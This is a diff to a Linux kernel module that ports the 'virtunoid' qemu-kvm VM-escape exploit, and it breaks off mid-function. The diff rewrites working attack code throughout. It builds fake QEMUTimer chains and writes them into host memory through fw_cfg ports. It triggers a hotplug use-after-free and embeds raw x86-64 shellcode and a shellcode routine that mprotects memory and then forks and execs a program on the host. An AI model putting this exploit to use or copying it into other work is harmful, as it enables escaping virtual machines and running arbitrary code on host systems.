@@ -11,32 +11,23 @@
 #include <linux/syscalls.h>
 #include <asm/io.h>		// for virt_to_phys()
 
-//#include "virtunoid-config.h"
-#include "shellcode-config.h"
+#include "virtunoid-config.h"
+//#include "shellcode-config.h"
 #define QEMU_GATEWAY  0x0202000a //"10.0.2.2"
-
-//defines for virtunoid
+//#define QEMU_GATEWAY  0x017aa8c0//"192.168.122.1"
 
 #include <stdarg.h>
 #include <linux/rtc.h>
+#include <linux/delay.h>
+#include <linux/errno.h>
 
-
-//#define offsetof __builtin_offsetof
-
-/*#define min(a,b) ({				\
-    typeof(a) __a = a;                          \
-    typeof(b) __b = b;                          \
-    __a < __b ? __a : __b;                      \
-        })
-*/
- 
 typedef uint64_t hva_t;
 typedef uint64_t gpa_t;
 typedef uint64_t gfn_t;
 typedef void    *gva_t;
 
 #define PAGE_SHIFT  12
-//#define PAGE_SIZE   (1 << PAGE_SHIFT)
+#define PAGE_SHIFT_SIZE   (1 << PAGE_SHIFT)
 #define PFN_PRESENT (1ull << 63)
 #define PFN_SWAPPED (1ull << 62)
 #define PFN_PFN     ((1ull << 55) - 1)
@@ -51,128 +42,141 @@ typedef void    *gva_t;
 
 #define PORT 0xae08
 
+//////////////////////////////////
+#include <asm/mman.h>
+int mprotect(const void *addr, size_t len, int prot);
+pid_t fork(void);
+int execv(const char *path, char *const argv[]);
 
+int die_errno(const char *msg) {
+    printk("error: %s.\n", msg);
+    return -1;
+}
 
+int assert(int val){
+    if(val != 1){
+        printk("assert fail.\n");
+        return -1;
+    }
+    return 0;
+}
 
+struct IORange *align_kmalloc(int cache_size){
+    struct IORange *object;
 
+    static struct kmem_cache *align_cache_p;
+    align_cache_p = kmem_cache_create("align_cache", cache_size, 0, SLAB_HWCACHE_ALIGN, NULL);
+    if (!align_cache_p)
+        die_errno("align_kmalloc");
 
+    object = kmem_cache_alloc(align_cache_p, GFP_KERNEL);
 
+    return object;
+}
+
+//from stackoverflow
+#include <linux/fs.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+#include <linux/buffer_head.h>
+
+struct file* file_open(const char* path, int flags, int rights) {
+    struct file* filp = NULL;
+    mm_segment_t oldfs;
+    int err = 0;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+    filp = filp_open(path, flags, rights);
+    set_fs(oldfs);
+    if(IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return NULL;
+    }
+    return filp;
+}
+
+//Close a file (similar to close):
+void file_close(struct file* file) {
+    filp_close(file, NULL);
+}
+
+//Reading data from a file (similar to pread):
+int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
+    mm_segment_t oldfs;
+    int ret;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    ret = vfs_read(file, data, size, &offset);
+    if (offset != 0)
+      printk("offset is %lli\n",offset);
+    set_fs(oldfs);
+    return ret;
+}
+
+//Writing data to a file (similar to pwrite):
+int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
+    mm_segment_t oldfs;
+    int ret;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    ret = vfs_write(file, data, size, &offset);
+
+    set_fs(oldfs);
+    return ret;
+}
+
+//Syncing changes a file (similar to fsync):
+int file_sync(struct file* file) {
+    vfs_fsync(file, 0);
+    return 0;
+}
+
+//////////////////////////////////
 //begin portbunny
 static struct {
     struct cmsghdr cm;
     struct in_pktinfo ipi;
-  } cmsg = { {sizeof(struct cmsghdr) + sizeof(struct in_pktinfo), SOL_IP, IP_PKTINFO},
-       {0, }};
+}cmsg = { {sizeof(struct cmsghdr) + sizeof(struct in_pktinfo), SOL_IP, IP_PKTINFO}, {0, }};
 
-
-
-static unsigned short in_cksum(unsigned short *addr, int len)
+/* Taken from iputils ping.c */
+u_short
+in_cksum(const u_short *addr, register int len, u_short csum)
 {
-  int nleft = len;
-  int sum = 0;
-  unsigned short *w = addr;
-  unsigned short answer = 0;
-  
-  while (nleft > 1) {
-    sum += *w++;
-    nleft -= 2;
-  }
-  
-  if (nleft == 1) {
-    *(unsigned char *) (&answer) = *(unsigned char *) w;
-    sum += answer;
-  }
-  
-  sum = (sum >> 16) + (sum & 0xFFFF);
-  sum += (sum >> 16);
-  answer = ~sum;
-  return (answer);
-}
+    register int nleft = len;
+    const u_short *w = addr;
+    register u_short answer;
+    register int sum = csum;
 
-static int send_icmp_packet(u32 destination, u32 icmp_type,
-         u32 icmp_code,
-         unsigned int icmp_data_size,
-         char *data,
-         u32 batch_id)			    
-{
-  
-  int size;	
-  
-  int len = icmp_data_size + sizeof(struct icmphdr);
-  char outbuf[len];
-
-  struct iovec iov;
-  struct socket *sock;
-  struct sockaddr_in whereto;
-  
-  struct icmphdr *icmp = (struct icmphdr *) outbuf;
-
-  int ret = sock_create(AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
-  struct msghdr msg = { &whereto, sizeof(whereto),
-            &iov, 1, &cmsg, 0, 0 };
-      
-  /* check if socket-creation was successful */
-  if(ret < 0){
-    printk("error creating socket\n");
-    return -1;
-  }
-  
-
-  /* fillout sockaddr_in-structure whereto */
-  
-  
-  memset(&whereto, 0, sizeof(whereto));
-  whereto.sin_family = AF_INET;
-  whereto.sin_addr.s_addr = destination;
-
-
-  /* construct packet */
-  memcpy((outbuf + sizeof(struct icmphdr)), data, icmp_data_size);	
-    
-  icmp->type = icmp_type;
-  icmp->code = icmp_code;
-  
-  if((icmp->type == ICMP_ECHO) || (icmp->type == ICMP_TIMESTAMP)){
-    /* Note: id is only 16 bit wide. */
-    icmp->un.echo.id = batch_id;		
-    icmp->un.echo.sequence = 0;
-    
-  }
-
-  icmp->checksum = 0;
-
-  iov.iov_base = outbuf;
-  iov.iov_len = sizeof(outbuf);
-  
-  /* calculate icmp-checksum */
-  icmp->checksum = in_cksum((ushort *)&outbuf, len);
-
-  /* fire! */
-
-  while(len > 0){
-    size = sock_sendmsg(sock, &msg, len);
-    
-    if (size < 0 ){			
-      /* If an error occurs, just don't deliver the
-       * packet but keep on going. */
-      printk("sock_sendmsg error: %d\n", size);
-      break;
+    /*
+     *  Our algorithm is simple, using a 32 bit accumulator (sum),
+     *  we add sequential 16 bit words to it, and at the end, fold
+     *  back all the carry bits from the top 16 bits into the lower
+     *  16 bits.
+     */
+    while (nleft > 1)  {
+        sum += *w++;
+        nleft -= 2;
     }
-    
-    len -= size;
-  }
-  
-  sock_release(sock);
-  sock = NULL;
 
-  return 0;
+    /* mop up an odd byte, if necessary */
+    if (nleft == 1)
+        sum += htons(*(u_char *)w << 8);
+
+    /*
+     * add back carry outs from top 16 bits to low 16 bits
+     */
+    sum = (sum >> 16) + (sum & 0xffff);    /* add hi 16 to low 16 */
+    sum += (sum >> 16);            /* add carry */
+    answer = ~sum;                /* truncate to 16 bits */
+    return (answer);
 }
 
 //end portbunny
-
-
-
-
 
 /* virtunoid.c: qemu-kvm escape exploit, 0.13.51 <= qemu-kvm <= 0.14.50
  *  by Nelson Elhage <nelhage@nelhage.com>
@@ -191,8 +195,6 @@ static int send_icmp_packet(u32 destination, u32 icmp_type,
 
 
 /***********************************************************************/
-
-
 
 struct QEMUClock {
     uint32_t type;
@@ -256,43 +258,30 @@ struct target_region {
     uint8_t *snapshot;
 };
 
-uint8_t buf[SIZEOF_E820_TABLE+2*PAGE_SIZE+SIZEOF_HPET_CFG];
+uint8_t buf[SIZEOF_E820_TABLE+2*PAGE_SHIFT_SIZE+SIZEOF_HPET_CFG];
 
 struct target_region targets[] = {
     { E820_TABLE, buf, SIZEOF_E820_TABLE, FW_CFG_E820_TABLE },
-    { HPET_CFG, buf + SIZEOF_E820_TABLE + PAGE_SIZE, SIZEOF_HPET_CFG, FW_CFG_HPET },
+    { HPET_CFG, buf + SIZEOF_E820_TABLE + PAGE_SHIFT_SIZE, SIZEOF_HPET_CFG, FW_CFG_HPET },
     { 0, 0, 0, 0}
 };
 
 uint64_t *fake_rtc;
 
-#include <linux/delay.h>
 void commit_targets(void) {
     struct target_region *t = targets;
-    printk("entering commit_targets\n");
-
-
-
-
-
     fake_rtc[OFFSET_RTCSTATE_NEXT_SECOND_TIME/sizeof(*fake_rtc)] = 10;
     for (; t->data; t++) {
         int i;
-	//	printk("t->entry is %016lx\n",t->entry);
         outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
-        for (i = 0; i < t->len - 1; i++){
-	  // printk("t->data[i] is %016lx\n",t->data[i]);
+        for (i = 0; i < t->len - 1; i++)
             outb(t->data[i], BIOS_CFG_DATAPORT);
-	}
 #ifdef DEBUG_COMMIT
         outw(FW_CFG_WRITE_CHANNEL | t->entry, BIOS_CFG_IOPORT);
         for (i = 0; i < t->len - 1; i++)
-	  //assert(inb(BIOS_CFG_DATAPORT) == t->data[i]);
-	  lkasjeflkasj;flksja;fkljas;dlkfja;lskdjfa;klsdjfaklsj
+            assert(inb(BIOS_CFG_DATAPORT) == t->data[i]);
 #endif
     }
-
-    printk("leaving commit targets\n");
 }
 
 void refresh_targets(void) {
@@ -332,7 +321,7 @@ void *host_alloc(size_t size) {
         }
     }
     printk("host_alloc(%d) failed!\n", (unsigned)size);
-    //    assert(0);
+    assert(0);
     return NULL;
 }
 
@@ -344,68 +333,75 @@ void* obj_alloc(size_t start, size_t last) {
 
 /*********************************************************************/
 
-/*uint32_t page_offset(unsigned long addr) {
+uint32_t addr_page_offset(unsigned long addr) {
     return addr & ((1 << PAGE_SHIFT) - 1);
-    }*/
+}
 
-/*gfn_t gva_to_gfn(gva_t addr) {
-    static int fd = -1;
-    size_t off;
+gfn_t gva_to_gfn(gva_t addr) {
+    //static int fd = -1;
+    struct file *fd = NULL;
+    //size_t off;
+    loff_t off;
     uint64_t pte, pfn;
+    int len=0;
 
-
-    if (fd < 0)
-        fd = open("/proc/self/pagemap", O_RDONLY);
-    if (fd < 0)
+    if (fd == NULL)
+        fd = file_open("/proc/self/pagemap", O_RDONLY, 0);
+        //fd = open("/proc/self/pagemap", O_RDONLY);
+    if (fd == NULL)
         die_errno("open");
     off = ((uintptr_t)addr >> 9) & ~7;
-    if (lseek(fd, off, SEEK_SET) != off)
+    //if (lseek(fd, off, SEEK_SET) != off)
+    if (generic_file_llseek(fd, off, SEEK_SET) != off)
         die_errno("lseek");
 
-    if (read(fd, &pte, 8) != 8)
+    //if (vfs_read(fd, (unsigned char *)&pte, 8, 0) != 8)
+    if ((len=file_read(fd, 0, (unsigned char *)&pte, 8)) != 8)//sys_read
         die_errno("read");
     if (!(pte & PFN_PRESENT))
         return (gfn_t)-1;
 
     pfn = pte & PFN_PFN;
     return pfn;
-    }*/
+}
 
-gpa_t gva_to_gpa(gva_t addr) {
+gpa_t gva_to_gpa_j(gva_t addr) {
   unsigned long paddr = virt_to_phys(addr);
   printk("Translated virtual address %016lx to phys addr %016lx\n",
-	 (long unsigned int)addr,
-	 (long unsigned int)paddr);
+         (long unsigned int)addr,
+         (long unsigned int)paddr);
   return paddr;
-  /*  gfn_t gfn = gva_to_gfn(addr);
-    //    assert(gfn != (gfn_t)-1);
-    return (gfn << PAGE_SHIFT) | page_offset((unsigned long)addr);*/
+}
+
+gpa_t gva_to_gpa(gva_t addr) {
+    gfn_t gfn = gva_to_gfn(addr);
+    assert(gfn != (gfn_t)-1);
+    return (gfn << PAGE_SHIFT) | addr_page_offset((unsigned long)addr);
 }
 
 hva_t highmem_hva_base = 0;
 
 hva_t gpa_to_hva(gpa_t gpa) {
-  if  (gpa <= 0x00100000)
-    printk("gpa too low\n");
+    assert (gpa > 0x00100000);
     return gpa  + highmem_hva_base;
 }
 
 hva_t gva_to_hva(gva_t addr) {
     struct target_region *r;
     for (r = targets; r->data; r++)
-        if (addr > (gva_t)r->data - PAGE_SIZE &&
+        if (addr > (gva_t)r->data - PAGE_SHIFT_SIZE &&
             addr < (gva_t)r->data + r->len) {
             return r->hva + (addr - (gva_t)r->data);
         }
 
-    return gpa_to_hva(gva_to_gpa(addr));
+    return gpa_to_hva(gva_to_gpa_j(addr));
 }
 
 /*
  * This structure is used to communicate data between the host and
  * guest post-exploitation.
  */
-#define page_aligned __attribute__((aligned(PAGE_SIZE)))
+#define page_aligned __attribute__((aligned(PAGE_SHIFT_SIZE)))
 
 struct shared_state {
     char prog[1024];
@@ -418,73 +414,21 @@ static volatile page_aligned struct shared_state share = {
   
 };
 
-
-
-#include <asm/mman.h>
-int mprotect(const void *addr, size_t len, int prot);
-pid_t fork(void);
-int execv(const char *path, char *const argv[]);
-
-
-
-/*00000000004016c5 <shellcode>:
-  4016c5:	55                   	push   %rbp
-  4016c6:	48 89 e5             	mov    %rsp,%rbp
-  4016c9:	48 83 ec 20          	sub    $0x20,%rsp
-  4016cd:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
-  4016d1:	be 02 00 00 00       	mov    $0x2,%esi
-  4016d6:	bf 70 00 00 00       	mov    $0x70,%edi
-  4016db:	b8 20 69 47 00       	mov    $0x476920,%eax
-  4016e0:	ff d0                	callq  *%rax
-  4016e2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
-  4016e6:	48 8b 80 00 04 00 00 	mov    0x400(%rax),%rax
-  4016ed:	ba 07 00 00 00       	mov    $0x7,%edx
-  4016f2:	be 00 20 00 00       	mov    $0x2000,%esi
-  4016f7:	48 89 c7             	mov    %rax,%rdi
-  4016fa:	b8 58 91 40 00       	mov    $0x409158,%eax
-  4016ff:	ff d0                	callq  *%rax
-  401701:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
-  401705:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
-  401709:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
-  401710:	00 
-  401711:	b8 78 7c 40 00       	mov    $0x407c78,%eax
-  401716:	ff d0                	callq  *%rax
-  401718:	85 c0                	test   %eax,%eax
-  40171a:	75 15                	jne    401731 <shellcode+0x6c>
-  40171c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
-  401720:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
-  401724:	48 89 d6             	mov    %rdx,%rsi
-  401727:	48 89 c7             	mov    %rax,%rdi
-  40172a:	b8 a8 86 40 00       	mov    $0x4086a8,%eax
-  40172f:	ff d0                	callq  *%rax
-  401731:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
-  401735:	c7 80 08 04 00 00 01 	movl   $0x1,0x408(%rax)
-  40173c:	00 00 00 
-  40173f:	c9                   	leaveq 
-  401740:	c3                   	retq   
-*/
-
-
-
-
-
-  /*void shellcode(struct shared_state *share) {
-  //  char *args[2];
-      //moved jfp
+void shellcode(struct shared_state *share) {
+    char *args[2];
     ((void(*)(int, int))ISA_UNASSIGN_IOPORT)(0x70, 2);
     ((typeof(mprotect)*)MPROTECT)((void*)share->shellcode,
-                                  2*PAGE_SIZE,
+                                  2*PAGE_SHIFT_SIZE,
                                   PROT_READ|PROT_WRITE|PROT_EXEC);
-    char *args[2] = {share->prog, NULL};
-    //    args[0] = share->prog;
-
-    //args[1] = NULL;
+    //char *args[2] = {share->prog, NULL};
+    args[0] = share->prog;
+    args[1] = NULL;
     if (((typeof(fork)*)FORK)() == 0)
         ((typeof(execv)*)EXECV)(share->prog, args);
     share->done = 1;
 }
 asm("end_shellcode:");
-extern char end_shellcode[];*/
+extern char end_shellcode[];
 
 /*
  * Construct and return a single fake timer, with the specified
@@ -503,13 +447,11 @@ struct QEMUTimer *fake_timer(hva_t cb, hva_t opaque, struct QEMUTimer *next) {
     return timer;
 }
 
-
-
 /*
  * Construct a timer chain that performs an mprotect() and then calls
  * into shellcode.
  */
-struct QEMUTimer *construct_payload(void) {
+struct QEMUTimer *construct_payload_j(void) {
     struct IORange *ioport;
     struct IORangeOps *ops;
     struct QEMUTimer *timer;
@@ -519,97 +461,6 @@ struct QEMUTimer *construct_payload(void) {
     uint8_t* ptr8;
     uint32_t* ptr32;
 
-    /*    const char* scc = "\x55		\
-\x48\x89\xe5\
-\x48\x83\xec\x20\
-\x48\x89\x7d\xe8\
-\xbe\x02\x00\x00\x00\
-\xbf\x70\x00\x00\x00\
-\xb8\x20\x69\x47\x00\
-\xff\xd0\
-\x48\x8b\x45\xe8\
-\x48\x8b\x80\x00\x04\x00\x00\
-\xba\x07\x00\x00\x00\
-\xbe\x00\x20\x00\x00\
-\x48\x89\xc7\
-\xb8\x58\x91\x40\x00\
-\xff\xd0\
-\x48\x8b\x45\xe8\
-\x48\x89\x45\xf0\
-\x48\xc7\x45\xf8\x00\x00\x00\
-\x00\
-\x48\x8b\x45\xe8\
-\xc7\x80\x08\x04\x00\x00\x01\
-\x00\x00\x00\
-\xc9\
-\xc3";
-    */
-    /*
-\xb8\x78\x7c\x40\x00\
-\xff\xd0\
-\x85\xc0\
-\x75\x15\
-\x48\x8b\x45\xe8\
-\x48\x8d\x55\xf0\
-\x48\x89\xd6\
-\x48\x89\xc7\
-\xb8\xa8\x86\x40\x00\
-\xff\xd0\
-    */
-
-
-    //#define EXIT 0x408a98
-    /*
-\xb8\x98\x8a\x40\x00\
-\xff\xd0\
-    */
-    //    goto bottom;
-  
-    /*  __asm__ __volatile__(
-			 ".section .rodata;\
- sc: .byte 0x55\
-,0x48,0x89,0xe5\
-,0xe8,0x1a,0x00,0x00,0x00\
-,0x2f\
-,0x75,0x73\
-,0x72,0x2f\
-,0x62\
-,0x69,0x6e,0x2f,0x67,0x6e,0x6f,0x6d\
-,0x65\
-,0x2d,0x63,0x61,0x6c,0x63\
-,0x75,0x6c\
-,0x61\
-,0x74,0x6f\
-,0x72,0x00\
-,0xbe,0x02,0x00,0x00,0x00\
-,0xbf,0x70,0x00,0x00,0x00\
-;movl %0, %%eax;.byte \
-0xff,0xd0\
-,0x58\
-,0x48,0x83,0xec,0x20\
-,0x48,0x89,0x45,0xf0\
-,0x48,0xc7,0x45,0xf8,0x00,0x00,0x00\
-,0x00\
-,0x48,0xc7,0xc0,0x78,0x7c,0x40,0x00\
-,0xff,0xd0\
-,0x85,0xc0\
-,0x75,0x15\
-,0x48,0x8b,0x45,0xf0\
-,0x48,0x8d,0x55,0xf0\
-,0x48,0x89,0xd6\
-,0x48,0x89,0xc7\
-,0xb8,0xa8,0x86,0x40,0x00\
-,0xff,0xd0\
-,0xc9\
-,0xc3;.section .text;"
-
-
-    extern void* sc asm("sc");
-    
-    */
-
-
-    //67, 4d, 6b, 6f
          const char* sc = "\x55\
 \x48\x8d\x2d\xf8\xff\xff\xff\
 \x31\xf6\x83\xc6\x02\
@@ -633,19 +484,19 @@ struct QEMUTimer *construct_payload(void) {
 \x48\x83\xc4\x20\
 \x5d\
 \xc3/usr/bin/gnome-calculator";
-	 printk(sc);        
-	 len = strlen(sc)+1;
+         printk(sc);
+         len = strlen(sc)+1;
 
     printk("shellcode len is %i\n",len);
-    
+
 
     printk("mask is %016lx\n",mask);
-    
+
 
     ops = kmalloc(sizeof *ops,GFP_ATOMIC);
     if (ops ==NULL){
-	printk("kmalloc failed\n");
-	while(1);
+        printk("kmalloc failed\n");
+        while(1);
     }
 
     ops->read = MPROTECT;
@@ -665,15 +516,15 @@ struct QEMUTimer *construct_payload(void) {
       mask = mask /2 ;
     for(i=0; i < 12; i++)
       mask = mask *2;
-		      */
+                      */
 
     mask += PAGE_SIZE;
 
     ioport = (struct IORange*)mask;
-    /*	(
-				 ((unsigned long int)ioport )
-				 | ~(PAGE_SIZE-1)
-				 )+PAGE_SIZE);*/
+    /*  (
+                                 ((unsigned long int)ioport )
+                                 | ~(PAGE_SIZE-1)
+                                 )+PAGE_SIZE);*/
     printk("ioport is %016lx\n", (long unsigned int)ioport);
 
 
@@ -686,11 +537,11 @@ struct QEMUTimer *construct_payload(void) {
     share.shellcode = gva_to_hva(ioport);
 
 
-    
+
     //printk("sc is 0x%x",*((int*)sc));
     //memcpy(ioport + 1, sc, len);
     printk("%i bytes of shellcode written\n",
-	   sprintf((char*)  (ioport+1),sc));//&len));
+           sprintf((char*)  (ioport+1),sc));//&len));
     printk((char*)(ioport+1));
     ptr8 = (uint8_t*)(ioport+1);
     ptr8 += len;
@@ -711,6 +562,31 @@ struct QEMUTimer *construct_payload(void) {
     timer = fake_timer(CPU_OUTL, 0, timer);//0x5e155e
 
     printk("leaving construct_payload\n");
+    return timer;
+}
+
+
+struct QEMUTimer *construct_payload(void) {
+    struct IORange *ioport;
+    struct IORangeOps *ops;
+    struct QEMUTimer *timer;
+
+    ops = kmalloc(sizeof *ops, GFP_ATOMIC);
+    ops->read = MPROTECT;
+    ops->write = 0;
+
+    ioport = align_kmalloc(2*PAGE_SHIFT_SIZE);
+    ioport->ops = gva_to_hva(ops);
+    ioport->base = -(2*PAGE_SHIFT_SIZE);
+
+    share.shellcode = gva_to_hva(ioport);
+
+    memcpy(ioport + 1, shellcode, (void*)end_shellcode - (void*)shellcode);
+
+    timer = NULL;
+    timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);
+    timer = fake_timer(IOPORT_READL_THUNK, gva_to_hva(ioport), timer);
+    timer = fake_timer(CPU_OUTL, 0, timer);
     return timer;
 }
 
@@ -738,7 +614,6 @@ struct QEMUTimer *construct_read(struct QEMUTimer *timer, hva_t hva, uint32_t **
  */
 uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr) {
     uint64_t val = 0;
-    //    int i = 0;
     uint32_t *low, *hi;
 
     struct QEMUTimer *timer = chain;
@@ -750,82 +625,13 @@ uint64_t read_host8(struct QEMUTimer *head, struct QEMUTimer *chain, hva_t addr)
     *hi = (uint32_t)-1;
     commit_targets();
     while (*hi == (uint32_t)-1) {
-
-      mdelay(1000);
+        mdelay(1000);
         refresh_targets();
     }
     val = ((uint64_t)*hi << 32) | (uint64_t)*low;
     rollback_targets();
     return val;
 }
-
-
-
-//from stackoverflow
-#include <linux/fs.h>
-#include <asm/segment.h>
-#include <asm/uaccess.h>
-#include <linux/buffer_head.h>
-
-struct file* file_open(const char* path, int flags, int rights) {
-    struct file* filp = NULL;
-    mm_segment_t oldfs;
-    int err = 0;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-    filp = filp_open(path, flags, rights);
-    set_fs(oldfs);
-    if(IS_ERR(filp)) {
-        err = PTR_ERR(filp);
-        return NULL;
-    }
-    return filp;
-}
-//Close a file (similar to close):
-
-void file_close(struct file* file) {
-    filp_close(file, NULL);
-}
-//Reading data from a file (similar to pread):
-
-int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_read(file, data, size, &offset);
-    if (offset != 0)
-      printk("offset is %lli\n",offset);
-    set_fs(oldfs);
-    return ret;
-}   
-//Writing data to a file (similar to pwrite):
-
-int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_write(file, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
-}
-//Syncing changes a file (similar to fsync):
-
-int file_sync(struct file* file) {
-    vfs_fsync(file, 0);
-    return 0;
-}
-
-
-
-
 
 /*
  * Massage the RTC into a convenient state for the exploit. Wait for a
@@ -840,101 +646,99 @@ int file_sync(struct file* file) {
  *
  * See qemu-kvm:hw/mc146818rtc.c for the relevant code.
  */
-
-
-
-
-
-
-void wait_rtc(void) {
+void wait_rtc_j(void) {
     struct file *fd;
     int val;
     struct rtc_device *rtc;
     int len=0;
 
-  if ((fd = file_open("/dev/rtc", O_RDONLY,0)) ==NULL )//sys_open
-        printk("open(/dev/rtc)\n");
-    
-  if ((rtc = rtc_class_open("rtc0"))==NULL)
-    printk("open rtc0 failed\n");
-  //  mutex_unlock(&rtc->ops_lock);
-  rtc_update_irq_enable(rtc, 1);
-  printk("[+] UIE has been turned on\n");
-
-  //int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
-
+    if ((fd = file_open("/dev/rtc", O_RDONLY,0)) == NULL )//sys_open
+          die_errno("open(/dev/rtc)");
+      
+    if ((rtc = rtc_class_open("rtc0")) == NULL)
+        die_errno("open rtc0 failed");
+    //  mutex_unlock(&rtc->ops_lock);
+    rtc_update_irq_enable(rtc, 1);
+    printk("[+] UIE has been turned on\n");
   
-  if ((len=file_read(fd,0, (unsigned char *)&val, sizeof val)) != sizeof(val)){//sys_read
+    //int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
+    if ((len=file_read(fd,0, (unsigned char *)&val, sizeof val)) != sizeof(val)){//sys_read
         printk("error in read()\n");
-	printk("len was %i\n",len);
-	printk("fd->f_op is %016lx\n",(long unsigned int)fd->f_op);
-	printk("fd->f_op->read is %016lx\n",(long unsigned int)fd->f_op->read);
-	printk("fd->f_op->aio_read is %016lx\n",(long unsigned int)fd->f_op->aio_read);
-	printk("size of val is %li\n",sizeof val);
-	
-	while(1);
-  }
-
-  rtc_update_irq_enable(rtc, 0);
-  printk("RTC_UIE turned off\n");
-  rtc_class_close(rtc);
- file_close(fd);
-  outb(10,   0x70);
-  outb(0xF0, 0x71);
+  	printk("len was %i\n",len);
+  	printk("fd->f_op is %016lx\n",(long unsigned int)fd->f_op);
+  	printk("fd->f_op->read is %016lx\n",(long unsigned int)fd->f_op->read);
+  	printk("fd->f_op->aio_read is %016lx\n",(long unsigned int)fd->f_op->aio_read);
+  	printk("size of val is %li\n",sizeof val);
+  	
+  	while(1);
+    }
+  
+    rtc_update_irq_enable(rtc, 0);
+    printk("RTC_UIE turned off\n");
+    rtc_class_close(rtc);
+    file_close(fd);
+    outb(10,   0x70);
+    outb(0xF0, 0x71);
 }
 
+void wait_rtc(void) {
+    struct file *fd;
+    struct rtc_device *rtc;
 
+    int val;
+    if ((fd = file_open("/dev/rtc", O_RDONLY, 0)) == NULL)
+        die_errno("open(/dev/rtc)");
+    rtc = fd->private_data;
+    if (rtc_update_irq_enable(rtc, 1) < 0)
+        die_errno("RTC_UIE_ON");
+    if (file_read(fd, 0, (unsigned char *)&val, sizeof val) != sizeof(val))
+        die_errno("read()");
+    if (rtc_update_irq_enable(rtc, 0) < 0)
+        die_errno("RTC_UIE_OFF");
+    file_close(fd);
+    outb(10,   0x70);
+    outb(0xF0, 0x71);
+}
 
 static int __init server_init( void )
 {
-  unsigned int data_size;
-  unsigned int data_offset;
-  mm_segment_t oldfs;
+    mm_segment_t oldfs;
 
-
-
-  //begin virtunoid
-  //    int fd;
     int i;
-        unsigned char packet[SIZEOF_RTCSTATE - PACKET_OFFSET];
-    //struct icmphdr *icmp = (struct icmphdr*)packet;
-    //struct sockaddr_in dest = {};
+    unsigned char packet[SIZEOF_RTCSTATE - PACKET_OFFSET];
+
+    int len = sizeof(packet);
+    struct icmphdr *icmp = (struct icmphdr*)packet;
+    struct sockaddr_in dest = {};
+
     struct QEMUTimer *timer, *timer2;
     hva_t timer_hva;
     hva_t ram_block;
 
+    struct iovec iov;
+    struct socket *sock;
 
+    int ret = sock_create(AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
+    struct msghdr msg = { &dest, sizeof(dest),
+              &iov, 1, &cmsg, 0, 0 };
 
-  printk("ENTER MODULE");
+    /* check if socket-creation was successful */
+    if(ret < 0){
+        printk("error creating socket\n");
+        return -1;
+    }
+
   
-  data_size = SIZEOF_RTCSTATE - PACKET_OFFSET - sizeof(struct icmphdr);
-  data_offset=sizeof(struct icmphdr);
-  
+    printk("[+] ENTER MODULE.\n");
 
- 
-
-
-  oldfs = get_fs();
-  set_fs(get_ds());
-
-
+    oldfs = get_fs();
+    set_fs(get_ds());
 
     memset(buf, 0, sizeof buf);
+    memset(packet, 0x33, sizeof(packet));
 
-    
- 
-
-    /*
-    clock = malloc(sizeof *clock);
-    clock->type = 0;
-    clock->enabled = 1;
-    */
-
-    if (OFFSET_RTCSTATE_NEXT_SECOND_TIME >=
-	OFFSET_RTCSTATE_SECOND_TIMER){
-      printk("assertion failed: NEXTSECONDTIME\n");
-      while(1);
-    }
+    assert(OFFSET_RTCSTATE_NEXT_SECOND_TIME <
+           OFFSET_RTCSTATE_SECOND_TIMER);
     fake_rtc = obj_alloc(OFFSET_RTCSTATE_NEXT_SECOND_TIME,
                     SIZEOF_RTCSTATE);
 
@@ -951,32 +755,51 @@ static int __init server_init( void )
     *RTC(hva_t, OFFSET_RTCSTATE_SECOND_TIMER) = timer_hva;
     *RTC(uint64_t, OFFSET_RTCSTATE_NEXT_SECOND_TIME) = 10;
 
-    //icmp->checksum = in_cksum((void*)&packet, sizeof packet, 0);//jfp
-
     snapshot_targets();
 
     //if (sys_iopl(3))
-    //  printk("iopl");//jfp
+    //    printk("iopl");
 
     commit_targets();
+
+    printk("[+] Constructing socket...\n");
+    /* fillout sockaddr_in-structure whereto */
+    memset(&dest, 0, sizeof(dest));
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = QEMU_GATEWAY;
+
+    icmp->type = ICMP_ECHO;
+    icmp->code = 0;
+    icmp->un.echo.id = 0xabcd;
+    icmp->un.echo.sequence = htons(1);
+    icmp->checksum = 0;
+
+    iov.iov_base = packet;
+    iov.iov_len = sizeof(packet);
+
+    /* calculate icmp-checksum */
+    icmp->checksum = in_cksum((void*)&packet, len, 0);
 
     printk("[+] Waiting for RTC interrupt...\n");
     wait_rtc();
     printk("[+] Triggering hotplug...\n");
     outl(2, PORT);
+    printk("[+] Done hotplug...\n");
     i = 0;
     while (timer->expire_time == 0) {
-      send_icmp_packet(QEMU_GATEWAY,ICMP_ECHO,0,data_size,(packet + data_offset)
-      	       ,0);        //jfp today
-      //sendto(fd, &packet, sizeof packet, 0,
-      //       (struct sockaddr*)&dest, sizeof dest);
